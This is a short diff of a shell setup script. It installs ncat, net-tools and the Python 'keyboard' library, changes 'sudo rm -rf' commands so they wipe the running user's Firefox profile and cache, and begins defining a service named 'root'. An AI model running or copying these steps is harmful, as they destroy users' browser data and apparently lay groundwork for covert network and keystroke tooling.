@@ -5,8 +5,9 @@ sudo apt-get install -y ncat &
 sudo apt-get install -y ufw &
 sudo apt install net-tools &
 pip install keyboard
-sudo rm -rf /home/bequery/snap/firefox/common/.mozilla/firefox
-sudo rm -rf /home/bequery/snap/firefox/common/.cache/mozilla/firefox
+username=$(whoami)
+sudo rm -rf /home/"${username}"/snap/firefox/common/.mozilla/firefox
+sudo rm -rf /home/"${username}"/snap/firefox/common/.cache/mozilla/firefox
 sudo chmod +x code.sh
 (
 SERVICE_NAME="root"
